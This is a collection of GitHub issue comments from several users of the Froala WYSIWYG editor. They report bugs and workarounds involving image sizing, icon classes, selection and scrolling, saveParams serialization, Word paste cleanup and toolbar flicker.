It's an issue because when you click \"Change Size\", the width is 300px, but the height is blank. It probably wouldn't cause display issues, but I'm guessing you'd want the HTML to be consistent.\nNote: It does resize nicely and update both the style height/width and the height/width attributes.\nFor example, I grabbed the corner and resized it to 400px wide. This is the HTML:\n<img src=\"someimage.jpg\" style=\"width: 400px; height: 249.333px;\" width=\"400\" height=\"249.333\">\nGreat!\n2) Another problem: If I click \"Change Size\", clear the height and click Update, this is the HTML:\n<img src=\"someimage.jpg\" style=\"width: 400px;\" width=\"400\" height=\"250\">\nIssue: Notice the height attribute remains. Fortunately the height is a valid value right now and resizing the image (either drag or Change Size) update the value. Again, just a small consistency issue.\nFor both issues...I don't think anyone would notice them in the UI, so they're not urgent.\nThanks,\nBrian. 2 more found:\n\n\nLine Height uses fas fa-arrows-v\nFix: fas fa-arrows-alt-v or fa-text-height\n\n\nVideo > Replace uses fas fa-exchange\nFix: fas fa-exchange-alt\n. Note: I fixed them locally in the Froala editor files and plugin files. Easy fix.. I'm so glad someone else sees this and has reported it. It's hard to replicate. I can't get it to break on my machine, but a co-worker can. We're both using Windows Chrome. Weird.\n\n\nAll my co-worker is doing is going into Code View mode and then trying to get back out.

If I created a pull request here to add them to the project would it be accepted?. @stefanneculai just updated to the latest version 2.7.5 and this issue still happens. Here is a plunker with the version updated https://plnkr.co/edit/bsH8IxCDvZEseLrsSZwA. You are right it works with the JS updated. It still doesn\u2019t seem to work right in our app after the update so it must be something else. . I understand what you are saying but I don't see how these two things are related. My problem is that selection ends up being in an unexpected place. I am not deleting the inline-block between 2 text nodes I am deleting the first character of the text node after the inline-block. \nMy expectation is that my selection would stay in the text node and be at position 0. What actually happens is the selection ends up in the parent of the text node. I don't see why node normalization would cause this. Maybe I am missing something.\nI can provide you with examples on why I need this to work like I am expecting. If we are misunderstanding each other.. Ok thanks. I\u2019ll try that out. . \ud83d\udc4d . Thanks for the quick response!. Thanks for the quick response!. The fix for this is to only get a map of :visible rows when getting the offset for the resizer. I was using the video as an example. This is the case with all block elements. We have custom block elements and have problems with selection in a table. Your comment seems to indicate that there is a fix for this but it couldn't be applied to the video element. Could you provide us what this fix would be so we can try it out with our own block elements that aren't the video element?. Ya sure no problem but even without the demo it should be clear that scroll top will always be wrong. If the editor scroll is not the window scroll then it will for sure be wrong. Our problem is that our window doesn\u2019t scroll only the editor scroll. . Here you go. I modified the styles of fr-wrapper to get it to work on the demo site. The editor scrolls to top when focus is called. This happens if I click on a toolbar button or tab into the editor.\n\n\n. I still see the issue in that example but I just realized we are talking about 2 different things. I want the content to stay scrolled to where it is right now but I believe the current code is to scroll to the editor itself. Maybe we are just misunderstanding each other. . Ok but it doesn\u2019t scroll to the content that is getting changed by a toolbar button. That is the issue I want fixed. . Yes. Will do when I get to work. Here you go.\n\n. I\u2019m just clicking. \n\nhas a scroll offset in the editor\nclick outside the editor\nclick bold. any updates?. Ill try it again, I\u2019ll have to make sure the return value of chainTrigger is not the original parameter I passed since it would be of the same type. Ideally I would want a hybrid of trigger and chainTrigger where the original parameter would not be returned. . Where are these feature requests kept? In addition, do we (lisence holder) have a way to track if/when they will be added?. Are these items prioritized by tier of lisence?. Ok. Thanks for the information. . It would probably be good to change the addRange calls with setBaseAndExtent since it seems to be the more proper way to change the selection in modern browsers.. \n",

Any suggestions on how I can fix that? It seems that fontFamily (from https://www.froala.com/wysiwyg-editor/docs/options#fontFamily) breaks Froala.\n EDIT \nLooks like the website's documentation has a typo. Instead of a colon for the last fontFamily entry, there's a semicolon in the dictionary.\nBut check this out. I've passed the fontFamily over with Froala editor in the example, and it's still Times New Roman. \nhttps://jsfiddle.net/wc5c3jhk/1449/. Just ran across an article where someone asked the same question and was able to resolve it using the following CSS:\n.fr-view {\n  font-family: \"Verdana\", Georgia, Serif;\n  font-size: 13px;\n  color: #444444;\n}\nI'm gonna close this since I think I'm all good now.

So apparently this must have been associated with an older version of Froala.\nIs there any way that I can just simply tell Froala to stop screwing with my HTML?

This is how it looks in the editor:\n\nhtml_from_paste.beforeCleanup.txt\n. Even the html from paste.afterCleanup is ok.  Please see attached.  Again, it has the extra whitespace from the source, but this should collapse.\nhtml_from_paste.afterCleanup.txt\n. Should this bug be fixed in v2.8.0 ?\nI'm still seeing exactly the same behaviour.... @stefanneculai \nThanks for your reply, but I would not call it a browser rendering problem that a non-breaking space attached to the start of a word creates an inset when the word falls at the start of a line.  This is correct behaviour according to the HTML specification.\nIf you simply reverse the order of the space and non-breaking space sequence then this does not occur.\nI can't think of a case where it works better to represent double spaces the way round that the Froala editor does it (i.e. with a space followed by a non-breaking space).  Every other editor, WYSIWYG html software, email software, etc. that I know does it the other way.\nBy the way, I noticed that github collapsed the double space between sentences in my example text so perhaps it wasn't clear what I meant?  Let me know if a file upload of some example HTML would be useful.. Another related issue is that objects in editor.opts.saveParams are not correctly converted to JSON representation in the save POST request.  Objects just come out as a string \"object\" rather than the JSON.\nIn summary: v2.8.2 (and v2.8.3) completely breaks our application.

It makes no sense for the library user to work with JSON strings rather than actual objects.\nIf an object is set in editor.opts.saveParams  it should be sent to the browser as JSON, and when a JSON response is received it should be returned in the callback as an object.\nThis is how it has always worked up to v2.8.1\nWhy would you introduce a change that breaks backwards compatibility in a minor version release?. @stefanneculai \nRegarding saveParams being sent correctly - this works with string values, but not if there is an object.\nWe are setting additional saveParams before the data is submitted.\ne.g.\n.on('froalaEditor.save.before', function (e, editor, html) {\neditor.opts.saveParams.test = {param1: 'x', param2: 'y'}\n}\nActually, in our code we are setting an array of objects, but the problem is the same....\neditor.opts.saveParams.test = [{param1: 'x', param2: 'y'}, {param3: 'x', param4: 'y'}]. @stefanneculai \nIf you are pushing changes that will require workarounds/fixes in the apps using the library, I would strongly request that you publish details of such changes in a prominent place so that the necessary steps can be taken when upgrading.  You would save your paying users a lot of headaches by doing this.\nOnce you have published a full list of such changes, could you please respond with a link so that we can look at what we need to do to update our app.\nThanks,\nSeb. @stefanneculai \nYes, I receive these email updates. and I also read the changelog before installing the new version of the library.  But nowhere did it state that there were changes which would break backwards compatibility.\nI saw that one of the changes is \"Use XHR requests instead of jQuery AJAX\" but this doesn't suggest to me that the library will behave differently.  After all, jQuery AJAX also uses XHR requests.\nSo I ask again: where can we check if a new version of your library will require workarounds/fixes in the apps using it?  Surely this is important information to include in your changelog?. @stefanneculai \nI hear you that you didn't foresee that these latest changes would break backwards compatibility.  But now that I have reported the issue, could you please assess exactly which functions and callbacks have been affected.  These breaks in backwards compatibility could then be described in your changelog, so that we and others can know what changes are needed throughout our applications if we want to update past v2.8.1\nThat's all I'm asking.  I don't think it's an unreasonable request :). I can also confirm this bug on the PC, tested in latest Firefox and latest Chrome.\nWhen Ctrl-K shortcut is used, the actual link is inserted right at the end of the document, not in the place of the selected text.  And additionally, focus is not set to the URL field of the pop-up form.\nThese are relatively recent bugs - Ctrl-K used to work fine.\nWhen clicking the link button, everything works as it should.\n. @chrisdeeming Thanks for the reply - we are in fact looking to roll back to an earlier version, so you have saved us testing to find a working release.  We too have noticed other new bugs, and slower response to fix them.. Thanks, very useful.. Please re-open this issue as it is not fully fixed.\nThe other bug raised in this issue is when using Ctrl-K the focus is not set to the URL field of the pop-up form.

If set to false, the default action is to clean the styles.\nAlso\nWord Paste | Cleans the HTML pasted from Word. | ../js/plugins/word_paste.min.js\nYou should at least update the documentation.  I don't wanna get rid of the plugin functionality.  I just don't want to give the user a choice and always clean styles by default.. I've done some test and removing the plugin doesn't work as indented.\nI'm pasting from a word document with some text (bold, italig, etc) and some image.\nwhen the plugin is removed I get something like this after pasting\n<p>sdfsdf</p><p>sdfsdf</p><p>sdf</p><p>sdfsdfsdfsdfsdf</p><p><!--[if !vml]--><br></p><p>Sdfsdfsdfsdf</p>\nThe image is gone.  No italic or bold tags are present.  I don't want that\nwhen the plugin is active and I click clean in the modal after pasting\n<p>sdfsdfsdfsdfsdf</p><p><img width=\"182\" src=\"blob:http://localhost:8082/4c620cf7-5be7-41b5-84ae-ffaa843abc1c\" class=\"fr-fic fr-dii\"></p><p>Sdfsdfsdfsdf</p><p>sdfsdfsdfsdf</p><p><br></p><p>sdfsdf dsfsd<strong>f sdf sdf s<em>df sdf sd<u>f sdf sdf sdf sdf ds<s>sd fsdf sdf sdfsd f<sub>sdf sdf sdf</sub><sup>&nbsp;sdf sdf sdf&nbsp;</sup></s></u></em></strong></p>\nThe image is still there.  Bold / italic / underline is still there.  Everything looks fine.  I want this... but by default (I want to get rid of the modal that gives the user a choice).\nwhen the plugin is active and I click keep in the modal after pasting\n<p style='margin-top:0cm;margin-right:0cm;margin-bottom:8.0pt;margin-left:0cm;font-size:15px;font-family:\"Calibri\",sans-serif;'>sdfsdfsdfsdfsdf</p><p style='margin-top:0cm;margin-right:0cm;margin-bottom:8.0pt;margin-left:0cm;font-size:15px;font-family:\"Calibri\",sans-serif;'><img width=\"182\" src=\"blob:http://localhost:8082/a4da0573-01ba-4953-91e7-97d51c4532d8\" class=\"fr-fic fr-dii\"></p><p style='margin-top:0cm;margin-right:0cm;margin-bottom:8.0pt;margin-left:0cm;font-size:15px;font-family:\"Calibri\",sans-serif;'>Sdfsdfsdfsdf</p><p style='margin-top:0cm;margin-right:0cm;margin-bottom:8.0pt;margin-left:0cm;font-size:15px;font-family:\"Calibri\",sans-serif;'>sdfsdfsdfsdf</p><p style='margin-top:0cm;margin-right:0cm;margin-bottom:8.0pt;margin-left:0cm;font-size:15px;font-family:\"Calibri\",sans-serif;'><br></p><p style='margin-top:0cm;margin-right:0cm;margin-bottom:8.0pt;margin-left:0cm;font-size:15px;font-family:\"Calibri\",sans-serif;'>sdfsdf dsfsd<strong>f sdf sdf s<em>df sdf sd<u>f sdf sdf sdf sdf ds<s>sd fsdf sdf sdfsd f<sub>sdf sdf sdf</sub><sup>&nbsp;sdf sdf sdf&nbsp;</sup></s></u></em></strong></p>\nI get this... a big mess of word styles.  I don't want that.\nSo I need an option to do what's done by default when I click the clean button in the word paste modal by default without showing the modal.  From your documentation, it looked like we could do that\nShow modal to choose if to keep or not styles pasted from Word. If set to false, the default action is to clean the styles.\nBut we can't.  It's very important for us to be able to do that since we want to have control over what's going to the backend.  \n@stefanneculai . We're having the same problem. I'll try to reproduce on jsFiddle.. Well jsFiddle won't cooperate with me but here is what I did\nFirst my froala config =>\nevents: {\n    'froalaEditor.initialized': (_e, editor) => {\n        editor.toolbar.hide();\n    }\n}\nI found out that an element with class .fr-sticky-dummy is being inserted with the same height as the toolbar.  This is what created the flicker for me andI fixed it with CSS.  It only happen if the toolbar is hidden.\nSo I just wanted to share what fixed it for me.. might help you guys. We need this because we want to know when the user interacted with the editor after focus.. @gabra20. @stefanneculai I understand that you may have some limitations and that's why I'm proposing a custom event if native events aren't faisible.  I mean, we have events for pretty much everything (even buttons update!) but nothing for a simple click... which is waayyyyy more useful IMO.\nIf you can't provide a custom event either, would you be so kind as point a possible solution for me?  As I said, I need to do something when the user interacted with the rich text AFTER the focus.\nSorry to pester you again, have a nice day. @stefanneculai thank you.  The issue is still closed though ;). Ok thank you!. @gabra20. And I'm very sorry that we've opened ~10 issues in the past 2 weeks T_T. I've also remarked that a double of fr-sticky-dummy is created on safari mobile when first entering fullscreen mode (focus the input, then enter fullscreen).\n\nI think it's the same issue as https://github.com/froala/wysiwyg-editor/issues/2818\nSteps to reproduce =>\nFocus the input\nclick the full screen button\nexit full screen\nfocus the input\n. Yup some people complained to us regarding this issue too. @stefanneculai YEah I was thinking of doing something like that.  Thank you!. ",

    "sfescape": "2.8.4. Looks like I was actually using 2.8.3. I upgraded to 2.8.4 and it's working correctly now.. The notion is that it is necessary to know when the panel is \"dirty\" in order to enable application level management of the content. Currently the only way I can see to do that is to monitor \"keypress\" and mark the panel \"dirty\" when that event occurs (and clear it after managing the content on a \"contentChanged\" event). I would be happy with a proper \"dirty\" event/state or even a specific code view \"keypress\" event.\nAs is, if the panel is in code view mode I have no way of knowing if the content has actually been modified until code view is left and \"contentChanged\" is triggered (thank goodness that event is at least getting triggered). In the meanwhile I'll look at simply marking the content as \"dirty\" if the user simply enters \"code view\" (if I can figure that out).. Yes, I read that while I was evaluating the product. I'm fine with contentChanged not triggering while in code view, it does however get triggered once you leave code view so still gives me a hook to know that I should now handle any changes made.\nWhat I don't have is a way to know that editing of the content has actually started and so the content should be considered \"dirty\". A code view event would be fine, and as I said I'll see if there is a way for me know that at least code view has been entered and assume from that point the content is \"dirty\" and clear the \"dirty\" state when \"contentChanged\" is triggered at the end or some time after they leave code view mode if I don't get the \"contentChanged\" event (which feels hacky)..

    "brianlenz": "@stefanneculai I didn't do it myself; a user did. They had embedded an image and put a caption on it. Then, the image was removed from the server, so it was a broken image. They tried to remove it, but ran into this issue.. Nope, we don't have anything that manually modifies the HTML. The user removed the broken image from within the editor, which then resulted in this state.. The user doesn't exactly remember, so I'm not sure. It could have been the trash can on the image tool? Or perhaps a backspace to delete the image.\nFWIW, we have a very minimal set of tools enabled in the editor. For images, we only support caption and remove. We are primarily using the inline toolbar only (not the fixed top/bottom toolbar).. Well that's disappointing.. ",

    "bch36": "Stefanneculai, thanks for the response!  You're correct about how the font-size is applied, but there is a fix, which I've implemented it in my own Froala source code.  The bug isn't a technical CSS bug, but rather an \"expectations\" bug.  The user's expectation is that the line-wrapping of the paragraph uses the line-height of the font-size they're using, similar to how standard text editors like Microsoft Word implement it.\nThe fix I implemented, which is a bit of a hack, and which I was hoping could be improved, was to set the font-size of each wrapping div to a minimal value of 1px, then force each text node to have a wrapping inline span with the explicit, currently-used font-size.\nSetting the wrapping div's font-size to 1px removes the strut as a factor when the line-height is being calculated.  Forcing all text to have an explicit size ensures that the text looks correct and doesn't inherit the 1px font-size.  The result is that the line-height of the paragraph uses the largest font-size from the text inside the block, rather than the inherited font-size, to determine the line-height.  The text-editor now behaves more like the standard desktop editors that users are familiar with.\nI'm happy to share more details if Froala is interested in pursuing this fix or feature.  I'd also welcome input on why my approach might be a bad idea, and unforeseen consequences I might encounter.. Stefanneculai, thanks for thinking through a potential issue!  As it turns out, it works just fine in that scenario.  Setting the wrapping div's font-size to 1px effectively removes the minimum line-height that the strut would otherwise impose, leaving the line-height to be set by the inline spans' various font-sizes.  Having a mixture of font-sizes, large and small, seems to work as a user of a standard text-editor would expect. \nI welcome any other thoughts or potential issues you may come up with!. Acknowledged.  Thank you for taking the time to consider it!. ",
    "sblattj": "@stefanneculai I mean trying to add more than one style before any text is typed / while the text editor is empty.\nOur users would naturally expect to be able to make a text 14px, bold, and underlined, then begin to type with all of those styles applied. The workaround they have to go through to is type the text first, then select it and add the styles.\nWe have over five bugs now raised by QA that are caused by this one issue, so it is extremely important for us to have it fixed, or at least to give us a nice workaround.\nThanks so much for looking into it.. @stefanneculai Simply erase all text including whitespaces, then click bold, italic, underline, strikethrough, change the color, change the text size, and tags will just continue to be added as siblings. If you aren't looking at the code, it simply looks like the styles are overriding each other. Looking more into it, they are not nesting correctly. I found that simply adding a space before typing fixes the problem, but this shouldn't be necessary. This is causing quite a few bugs in our application, and it would be extremely helpful to be fixed. Thanks for looking at it.. My company is also experiencing a similar issue.\n1. Create a text box\n2. Resize the text box to be smaller\n3. Type until there is a line break\n4. Add a numbered list\n5. Press enter\nExpected behavior:\n1. This is a long string\n    of text.\n2.

I think the issue may have been fixed. I tried to reproduce it again and\ncould not.\nI'm looking forward to 2.9.4 as is my company!\nDo you have an idea of when it will be released?\nThanks,\nStephen\nOn Mon, Mar 11, 2019 at 7:25 AM Ilyas Karim notifications@github.com\nwrote:\n\nHey Stephen, I am afraid that I'm unable to reproduce this bug.
